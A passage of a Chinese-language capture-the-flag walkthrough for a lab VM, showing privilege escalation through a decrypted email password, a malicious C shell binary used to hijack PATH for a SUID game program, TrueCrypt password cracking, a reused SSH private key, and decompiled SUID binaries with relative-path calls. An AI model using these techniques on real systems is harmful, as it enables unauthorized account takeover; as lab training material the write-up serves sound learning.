+<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br></pre></td><td class="code"><pre><span class="line">$ gpg --import .pgp/pgp.priv</span><br><span class="line">gpg: key 3F18AB0A: secret key imported</span><br><span class="line">gpg: /home/jack/.gnupg/trustdb.gpg: trustdb created</span><br><span class="line">gpg: key 3F18AB0A: public key <span class="string">&quot;jack@cowlovers.com&quot;</span> imported</span><br><span class="line">gpg: Total number processed: 1</span><br><span class="line">gpg:               imported: 1  (RSA: 1)</span><br><span class="line">gpg:       secret keys <span class="built_in">read</span>: 1</span><br><span class="line">gpg:   secret keys imported: 1</span><br><span class="line">$ gpg -o email.txt /var/mail/jack/received/message.eml</span><br><span class="line"></span><br><span class="line">You need a passphrase to unlock the secret key <span class="keyword">for</span></span><br><span class="line">user: <span class="string">&quot;jack@cowlovers.com&quot;</span></span><br><span class="line"></span><br><span class="line">2048-bit RSA key, ID 3F18AB0A, created 2014-06-18</span><br><span class="line"></span><br><span class="line">Enter passphrase: g0tmi1k69</span><br><span class="line">gpg: WARNING: cipher algorithm CAST5 not found <span class="keyword">in</span> recipient preferences</span><br><span class="line">gpg: encrypted with 2048-bit RSA key, ID 3F18AB0A, created 2014-06-18</span><br><span class="line">      <span class="string">&quot;jack@cowlovers.com&quot;</span></span><br><span class="line">gpg: WARNING: message was not integrity protected</span><br><span class="line">$ <span class="built_in">cat</span> email.txt</span><br><span class="line">Ok Jack. I<span class="string">&#x27;ve created the account &#x27;</span>milk_4_life<span class="string">&#x27; as per your request. Please stop emailing me about this now or I&#x27;</span>m going to talk to HR like we discussed.</span><br><span class="line"></span><br><span class="line">The password is <span class="string">&#x27;4J0WWvL5nS&#x27;</span></span><br></pre></td></tr></table></figure>
+
+<p>继续提权到新的账号</p>
+<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">$ su milk_4_life</span><br><span class="line">Password: 4J0WWvL5nS</span><br><span class="line"></span><br><span class="line">$ <span class="built_in">whoami</span></span><br><span class="line">milk_4_life</span><br><span class="line">$ </span><br></pre></td></tr></table></figure>
+
+<h3 id="环境变量劫持"><a href="#环境变量劫持" class="headerlink" title="环境变量劫持"></a>环境变量劫持</h3><p>milk_4_life 的主文件夹非常空，只有一个名为 <code>game</code> 的二进制文件</p>
+<p>但是，它的所有者是 george 用户，并且设置了 suid 属性</p>
+<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">$ <span class="built_in">ls</span> -l</span><br><span class="line">total 20</span><br><span class="line">---s--x--x 1 george      george      5743 Jun 19 18:24 game</span><br></pre></td></tr></table></figure>
+
+<p>运行该二进制文件会产生以下输出</p>
+<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">$ ./game</span><br><span class="line">I<span class="string">&#x27;m listening</span></span><br></pre></td></tr></table></figure>
+
+<p>这台虚拟机上没有 <code>netstat</code> 命令，我们使用 <code>ss</code> 代替</p>
+<p>该程序确实是在监听，端口是 1337</p>
+<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><span class="line">$ ss -lp</span><br><span class="line">State       Recv-Q Send-Q    Local Address:Port    Peer Address:Port</span><br><span class="line">LISTEN      0      50        127.0.0.1:mysql       *:*</span><br><span class="line">LISTEN      0      128       :::sunrpc             :::*</span><br><span class="line">LISTEN      0      128       *:sunrpc              *:*</span><br><span class="line">LISTEN      0      128       :::http               :::*</span><br><span class="line">LISTEN      0      128       :::38035              :::*</span><br><span class="line">LISTEN      0      128       *:35380               *:*</span><br><span class="line">LISTEN      0      128       :::ssh                :::*</span><br><span class="line">LISTEN      0      128       *:ssh                 *:*</span><br><span class="line">LISTEN      0      10        *:1337                *:*</span><br><span class="line">LISTEN      0      20        ::1:smtp              :::*</span><br><span class="line">LISTEN      0      20        127.0.0.1:smtp        *:*</span><br><span class="line">LISTEN      0      10        *:666                 *:*</span><br></pre></td></tr></table></figure>
+
+<p>使用 <code>telnet</code> 远程连接看看发现是个小游戏</p>
+<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br></pre></td><td class="code"><pre><span class="line">$ telnet 127.0.0.1 1337</span><br><span class="line">Trying 127.0.0.1...</span><br><span class="line">Connected to 127.0.0.1.</span><br><span class="line">Escape character is <span class="string">&#x27;^]&#x27;</span>.</span><br><span class="line">Type <span class="string">&#x27;START&#x27;</span> to begin</span><br><span class="line"></span><br><span class="line">START</span><br><span class="line">Starting...</span><br><span class="line"></span><br><span class="line">You have 30 seconds to get as many points as you can, beat the high score! (High Score: 133723)</span><br><span class="line"></span><br><span class="line">Quick what<span class="string">&#x27;s... 924 x 541? Umm</span></span><br><span class="line"><span class="string">Quick what&#x27;</span>s... 982 x 21? No idea</span><br><span class="line">Quick what<span class="string">&#x27;s... 194 x 542? Really ?</span></span><br><span class="line"><span class="string">Quick what&#x27;</span>s... 679 x 733? WHY WOULD I NEED TO KNOW THIS !?</span><br><span class="line">Quick what<span class="string">&#x27;s... 960 x 248? I give up.</span></span><br><span class="line"><span class="string">Quick what&#x27;</span>s... 718 x 646? THANKS OBAMA !</span><br><span class="line">Quick what<span class="string">&#x27;s... 162 x 784? ^C</span></span><br><span class="line"><span class="string">Connection closed by foreign host</span></span><br></pre></td></tr></table></figure>
+
+<p>编写脚本破解这个数学题</p>
+<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> socket</span><br><span class="line"><span class="keyword">import</span> re</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">main</span>():</span><br><span class="line">    <span class="comment"># 1. 创建TCP socket对象</span></span><br><span class="line">    client_socket = socket.socket(socket.AF_INET, socket.SOCK_STREAM)</span><br><span class="line"></span><br><span class="line">    <span class="comment"># 2. 连接到本地主机的1337端口（硬编码地址，可根据需要修改）</span></span><br><span class="line">    server_address = (<span class="string">&#x27;127.0.0.1&#x27;</span>, <span class="number">1337</span>)</span><br><span class="line">    client_socket.connect(server_address)</span><br><span class="line"></span><br><span class="line">    <span class="comment"># 3. 接收初始欢迎信息（假设服务器会发送一些欢迎数据）</span></span><br><span class="line">    client_socket.recv(<span class="number">1024</span>)</span><br><span class="line"></span><br><span class="line">    <span class="comment"># 4. 发送&quot;START&quot;命令开始认证/登录过程</span></span><br><span class="line">    client_socket.send(<span class="string">b&#x27;START\n&#x27;</span>)  <span class="comment"># 使用字节串以兼容Python 3</span></span><br><span class="line"></span><br><span class="line">    <span class="comment"># 5. 接收登录响应（假设固定长度110字节，可根据实际情况调整）</span></span><br><span class="line">    client_socket.recv(<span class="number">110</span>)</span><br><span class="line"></span><br><span class="line">    <span class="comment"># 6. 循环处理服务器发来的数学问题</span></span><br><span class="line">    <span class="keyword">while</span> <span class="literal">True</span>:</span><br><span class="line">        data = client_socket.recv(<span class="number">200</span>)  <span class="comment"># 每次最多接收200字节</span></span><br><span class="line">        <span class="keyword">if</span> <span class="keyword">not</span> data:</span><br><span class="line">            <span class="keyword">break</span>  <span class="comment"># 连接关闭，退出循环</span></span><br><span class="line"></span><br><span class="line">        <span class="comment"># 使用正则表达式提取问题中的乘法表达式</span></span><br><span class="line">        <span class="comment"># 示例问题格式: &quot;Quick what&#x27;s... 123 x 456?&quot;</span></span><br><span class="line">        matches = re.findall(<span class="string">r&quot;Quick what&#x27;s... (.*?)\?&quot;</span>, data.decode())</span><br><span class="line"></span><br><span class="line">        <span class="keyword">if</span> <span class="keyword">not</span> matches:</span><br><span class="line">            <span class="comment"># 如果没有匹配到问题，则打印接收到的数据（可能是最终结果或错误信息）并退出循环</span></span><br><span class="line">            <span class="built_in">print</span>(data.decode())</span><br><span class="line">            <span class="keyword">break</span></span><br><span class="line"></span><br><span class="line">        <span class="comment"># 解析乘法表达式，格式为 &quot;a x b&quot;</span></span><br><span class="line">        expression = matches[<span class="number">0</span>]</span><br><span class="line">        num1_str, num2_str = expression.split(<span class="string">&#x27; x &#x27;</span>)</span><br><span class="line">        num1 = <span class="built_in">int</span>(num1_str)</span><br><span class="line">        num2 = <span class="built_in">int</span>(num2_str)</span><br><span class="line">        result = num1 * num2</span><br><span class="line"></span><br><span class="line">        <span class="comment"># 打印计算结果（可用于调试）</span></span><br><span class="line">        <span class="built_in">print</span>(result)</span><br><span class="line"></span><br><span class="line">        <span class="comment"># 将结果发送回服务器</span></span><br><span class="line">        client_socket.send(<span class="built_in">str</span>(result).encode() + <span class="string">b&#x27;\n&#x27;</span>)</span><br><span class="line"></span><br><span class="line">    <span class="comment"># 7. 接收服务器最后的响应（例如完成信息）并打印</span></span><br><span class="line">    final_response = client_socket.recv(<span class="number">1024</span>)</span><br><span class="line">    <span class="built_in">print</span>(final_response.decode())</span><br><span class="line"></span><br><span class="line">    <span class="comment"># 8. 关闭socket连接</span></span><br><span class="line">    client_socket.close()</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> __name__ == <span class="string">&#x27;__main__&#x27;</span>:</span><br><span class="line">    main()</span><br></pre></td></tr></table></figure>
+
+<p>运行脚本</p>
+<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></td><td class="code"><pre><span class="line">$ python gamey3.py</span><br><span class="line">125451</span><br><span class="line">150858</span><br><span class="line">498300</span><br><span class="line">493353</span><br><span class="line">60564</span><br><span class="line">**** SNIP ****</span><br><span class="line">174386</span><br><span class="line">841312</span><br><span class="line">53636</span><br><span class="line">Final Score: 412619</span><br><span class="line"></span><br><span class="line">!*!*!*!*! Congratulations, new high score (412619) !*!*!*!*!</span><br><span class="line"></span><br><span class="line">I hear the faint sound of chmodding.......</span><br></pre></td></tr></table></figure>
+
+<p>看起来，当最高分被打破时，这个二进制文件会执行某个操作</p>
+<p>我不确定它修改了什么权限，但我很好奇我们是否可以反过来利用它，让它运行一个伪造的二进制文件，劫持环境变量呢？</p>
+<p>创建恶意二进制文件</p>
+<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;stdio.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;stdlib.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;sys/types.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;unistd.h&gt;</span></span></span><br><span class="line"><span class="type">int</span> <span class="title function_">main</span><span class="params">()</span></span><br><span class="line">&#123;</span><br><span class="line"> setuid( <span class="number">1000</span> );</span><br><span class="line"> system(<span class="string">&quot;id&quot;</span>);</span><br><span class="line"> system( <span class="string">&quot;/bin/sh -i&quot;</span> );</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
+
+<p>修改路径环境变量，使 <code>/tmp</code> 成为第一个检查的位置</p>
+<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">$ PATH=/tmp:<span class="variable">$PATH</span></span><br><span class="line">$ <span class="built_in">export</span> | grep PATH</span><br><span class="line"><span class="built_in">export</span> PATH=<span class="string">&#x27;/tmp:/usr/local/bin:/usr/bin:/bin:/usr/local/games:/usr/games&#x27;</span></span><br></pre></td></tr></table></figure>
+
+<p>分数被打破，我们确实被降级到一个新的 shell，成为 george 用户</p>
+<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">$ ./game</span><br><span class="line">I<span class="string">&#x27;m listening</span></span><br><span class="line"><span class="string">uid=1002(milk_4_life) gid=1002(milk_4_life) euid=1000(george) groups=1000(george),1002(milk_4_life)</span></span><br><span class="line"><span class="string">$</span></span><br></pre></td></tr></table></figure>
+
+<h3 id="TrueCrypt-爆破"><a href="#TrueCrypt-爆破" class="headerlink" title="TrueCrypt 爆破"></a>TrueCrypt 爆破</h3><p>乔治的个人文件夹里只有一个文件——TrueCrypt 加密容器</p>
+<p>挂载 TrueCrypt 容器需要我们知道容器密码，但我们目前还没有这个密码</p>
+<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">george@hell:~$ truecrypt --mount container.tc</span><br><span class="line">Enter mount directory [default]:</span><br><span class="line">Enter password <span class="keyword">for</span> /home/george/container.tc:</span><br><span class="line">Enter keyfile [none]:</span><br><span class="line">Protect hidden volume (<span class="keyword">if</span> any)? (y=Yes/n=No) [No]:</span><br><span class="line">No password or keyfile specified.</span><br></pre></td></tr></table></figure>
+
+<p>再仔细看看，乔治似乎也报名参加了 RockYou</p>
+<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">From: admin@rockyou.com</span><br><span class="line">To: super_admin@hell.com</span><br><span class="line">Subject: Account Activation</span><br><span class="line">Date: 13th November 2009</span><br><span class="line"></span><br><span class="line">Thanks <span class="keyword">for</span> signing up <span class="keyword">for</span> your account. I hope you enjoy our services.</span><br></pre></td></tr></table></figure>
+
+<p>爆破出密码为 </p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">letsyouupdateyourfunnotesandmore</span><br></pre></td></tr></table></figure>
+
+<h3 id="SSH-私钥泄露"><a href="#SSH-私钥泄露" class="headerlink" title="SSH 私钥泄露"></a>SSH 私钥泄露</h3><p>现在挂载它就容易多了</p>
+<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line">george@hell:~$ truecrypt --mount container.tc</span><br><span class="line">Enter mount directory [default]: ./tc</span><br><span class="line">Enter password <span class="keyword">for</span> /home/george/container.tc: letsyouupdateyourfunnotesandmore</span><br><span class="line">Enter keyfile [none]:</span><br><span class="line">Protect hidden volume (<span class="keyword">if</span> any)? (y=Yes/n=No) [No]:</span><br><span class="line"></span><br><span class="line">george@hell:~$ <span class="built_in">cd</span> tc</span><br><span class="line">george@hell:~/tc$ <span class="built_in">ls</span> -l</span><br><span class="line">total 2</span><br><span class="line">-rwx------ 1 george george 1679 Jul  5 20:01 id_rsa</span><br><span class="line">george@hell:~/tc$ </span><br></pre></td></tr></table></figure>
+
+<p>让我们用这个密钥以 bazza 的身份通过 SSH 登录</p>
+<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><span class="line">george@hell:~/tc$ ssh bazza@127.0.0.1 -i ./id_rsa</span><br><span class="line">Linux hell 3.2.0-4-486 <span class="comment">#1 Debian 3.2.57-3+deb7u2 i686</span></span><br><span class="line"></span><br><span class="line">The programs included with the Debian GNU/Linux system are free software;</span><br><span class="line">the exact distribution terms <span class="keyword">for</span> each program are described <span class="keyword">in</span> the</span><br><span class="line">individual files <span class="keyword">in</span> /usr/share/doc/*/copyright.</span><br><span class="line"></span><br><span class="line">Debian GNU/Linux comes with ABSOLUTELY NO WARRANTY, to the extent</span><br><span class="line">permitted by applicable law.</span><br><span class="line">Last login: Sun Jul 13 21:18:28 2014 from 192.168.0.102</span><br><span class="line">$ <span class="built_in">whoami</span></span><br><span class="line">bazza</span><br></pre></td></tr></table></figure>
+
+<h3 id="环境变量劫持-1"><a href="#环境变量劫持-1" class="headerlink" title="环境变量劫持"></a>环境变量劫持</h3><p>我们再次遇到了两个设置了 SUID 属性的二进制文件，不过这次我们可以读取这些文件，这意味着我们可以反编译它们</p>
+<p>先来看 part1，它对指定文件进行完整性校验，确认无误后执行目标程序</p>
+<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br></pre></td><td class="code"><pre><span class="line"><span class="type">int</span> __cdecl <span class="title function_">main</span><span class="params">()</span></span><br><span class="line">&#123;</span><br><span class="line">  <span class="type">int</span> result;</span><br><span class="line">  _BYTE v1[<span class="number">3</span>];</span><br><span class="line">  FILE *v2;</span><br><span class="line">  <span class="type">const</span> <span class="type">char</span> *v3;</span><br><span class="line">  <span class="type">const</span> <span class="type">char</span> *v4;</span><br><span class="line"></span><br><span class="line">  <span class="comment">// 预期的sha256sum输出（哈希值 + 文件名 + 换行符），用于校验part2文件</span></span><br><span class="line">  v4 = <span class="string">&quot;900462fbf9593f1a4b753f1729c431abc80932a151e9b293e13822a91f9641c1  /home/bazza/part2\n&quot;</span>;</span><br><span class="line">  <span class="comment">// 预期的sha256sum输出，用于校验/usr/bin/id文件</span></span><br><span class="line">  v3 = <span class="string">&quot;1003a011c5bdb65a07a8f92feb6b7d7ecbf3a3ff0f2a46abbe5c777c525996d8  /usr/bin/id\n&quot;</span>;</span><br><span class="line">  </span><br><span class="line">  <span class="comment">// 提示开始检查part2的完整性</span></span><br><span class="line">  <span class="built_in">printf</span>(<span class="string">&quot;Checking integrity of part2...&quot;</span>);</span><br><span class="line">  </span><br><span class="line">  <span class="comment">// 执行sha256sum命令计算part2的哈希值，并打开读取管道</span></span><br><span class="line">  v2 = popen(<span class="string">&quot;sha256sum /home/bazza/part2&quot;</span>, <span class="string">&quot;r&quot;</span>);</span><br><span class="line">  <span class="keyword">if</span> ( !v2 )</span><br><span class="line">    <span class="built_in">puts</span>(<span class="string">&quot;Failed to run command&quot;</span>); <span class="comment">// 如果管道打开失败，输出错误信息</span></span><br><span class="line">  </span><br><span class="line">  <span class="comment">// 从命令输出中读取一行（最多1034字节）到v1缓冲区</span></span><br><span class="line">  fgets(v1, <span class="number">1034</span>, v2);</span><br><span class="line">  </span><br><span class="line">  <span class="comment">// 比较实际输出与预期值v4</span></span><br><span class="line">  <span class="keyword">if</span> ( <span class="built_in">strcmp</span>(v1, v4) )</span><br><span class="line">  &#123;</span><br><span class="line">    <span class="comment">// 如果不匹配，说明文件损坏或路径错误</span></span><br><span class="line">    <span class="built_in">puts</span>(<span class="string">&quot;Uh oh.... Corrupted or in wrong directory (/home/bazza/)\n&quot;</span>);</span><br><span class="line">    result = <span class="number">0</span>;</span><br><span class="line">  &#125;</span><br><span class="line">  <span class="keyword">else</span></span><br><span class="line">  &#123;</span><br><span class="line">    <span class="comment">// 匹配成功，输出完成信息</span></span><br><span class="line">    <span class="built_in">puts</span>(<span class="string">&quot; Done!!\n&quot;</span>);</span><br><span class="line">    </span><br><span class="line">    <span class="comment">// 开始检查调用目标（/usr/bin/id）的完整性</span></span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">&quot;Checking integrity of calling target...&quot;</span>);</span><br><span class="line">    </span><br><span class="line">    <span class="comment">// 再次执行sha256sum命令计算/usr/bin/id的哈希值</span></span><br><span class="line">    v2 = popen(<span class="string">&quot;sha256sum /usr/bin/id&quot;</span>, <span class="string">&quot;r&quot;</span>);</span><br><span class="line">    <span class="keyword">if</span> ( !v2 )</span><br><span class="line">      <span class="built_in">puts</span>(<span class="string">&quot;Failed to run command&quot;</span>);</span><br><span class="line">    </span><br><span class="line">    <span class="comment">// 读取命令输出</span></span><br><span class="line">    fgets(v1, <span class="number">1034</span>, v2);</span><br><span class="line">    </span><br><span class="line">    <span class="comment">// 比较实际输出与预期值v3</span></span><br><span class="line">    <span class="keyword">if</span> ( <span class="built_in">strcmp</span>(v1, v3) )</span><br><span class="line">    &#123;</span><br><span class="line">      <span class="built_in">puts</span>(<span class="string">&quot;Target corrupt\n&quot;</span>); <span class="comment">// 不匹配则提示目标损坏</span></span><br><span class="line">      result = <span class="number">0</span>;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">else</span></span><br><span class="line">    &#123;</span><br><span class="line">      <span class="comment">// 两个文件均校验通过，输出确认信息</span></span><br><span class="line">      <span class="built_in">puts</span>(<span class="string">&quot; Done!!\n\nBinary and target confirmed.&quot;</span>);</span><br><span class="line">      </span><br><span class="line">      <span class="comment">// 执行part2程序</span></span><br><span class="line">      system(<span class="string">&quot;/home/bazza/part2&quot;</span>);</span><br><span class="line">      </span><br><span class="line">      <span class="comment">// 关闭管道</span></span><br><span class="line">      pclose(v2);</span><br><span class="line">      result = <span class="number">0</span>;</span><br><span class="line">    &#125;</span><br><span class="line">  &#125;</span><br><span class="line">  </span><br><span class="line">  <span class="keyword">return</span> result; <span class="comment">// 返回0</span></span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
+
+<p>再来看 part2，简单的权限检查示例</p>
+<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br></pre></td><td class="code"><pre><span class="line"><span class="type">int</span> __cdecl <span class="title function_">main</span><span class="params">()</span></span><br><span class="line">&#123;</span><br><span class="line">  <span class="type">__gid_t</span> v0;</span><br><span class="line">  <span class="type">int</span> result;</span><br><span class="line"></span><br><span class="line">  <span class="comment">// 检查当前进程的有效组ID（effective group ID）是否为1003</span></span><br><span class="line">  <span class="keyword">if</span> ( getegid() == <span class="number">1003</span> )</span><br><span class="line">  &#123;</span><br><span class="line">    <span class="comment">// 如果组ID为1003，输出一句幽默提示，并执行系统命令&quot;id&quot;显示当前用户身份信息</span></span><br><span class="line">    <span class="built_in">puts</span>(<span class="string">&quot;\nCan&#x27;t touch this *nah na na na na naaaaaaaa nah*&quot;</span>);</span><br><span class="line">    system(<span class="string">&quot;id&quot;</span>);</span><br><span class="line">    result = <span class="number">0</span>;</span><br><span class="line">  &#125;</span><br><span class="line">  <span class="keyword">else</span></span><br><span class="line">  &#123;</span><br><span class="line">    <span class="comment">// 如果组ID不是1003，获取实际组ID并输出错误信息，提示用户需要使用part1</span></span><br><span class="line">    v0 = getegid();</span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">&quot;\n\nError! %d ID detected ... you&#x27;re not allowed to run this, please use part 1!\n&quot;</span>, v0);</span><br><span class="line">    result = <span class="number">0</span>;</span><br><span class="line">  &#125;</span><br><span class="line">  <span class="keyword">return</span> result;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
+
+<p>因此，只有当有效组标识符为 1003 时，part2 才会运行</p>
+<p>运行 part1 会改变我们的有效组标识符，运行 part2 会改变我们的有效用户标识符，但似乎不会让我们以该用户 (oj) 的身份进入 shell</p>
+<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line">$ ./part1</span><br><span class="line">Checking integrity of part2... Done!!</span><br><span class="line"></span><br><span class="line">Checking integrity of calling target... Done!!</span><br><span class="line"></span><br><span class="line">Binary and target confirmed.</span><br><span class="line"></span><br><span class="line">Can<span class="string">&#x27;t touch this *nah na na na na naaaaaaaa nah*</span></span><br><span class="line"><span class="string">uid=1004(bazza) gid=1004(bazza) euid=1005(oj) egid=1003(developers) groups=1005(oj),1004(bazza)</span></span><br><span class="line"><span class="string">$ whoami</span></span><br><span class="line"><span class="string">bazza</span></span><br></pre></td></tr></table></figure>
+
+<p>进一步查看第二部分的源代码发现，它并没有为 <code>system(“id”)</code> 函数使用绝对路径，因此我们可以像之前修改伪造的 <code>chmod</code> 二进制文件那样，诱使该应用程序运行一个伪造的 <code>id</code> 二进制文件</p>
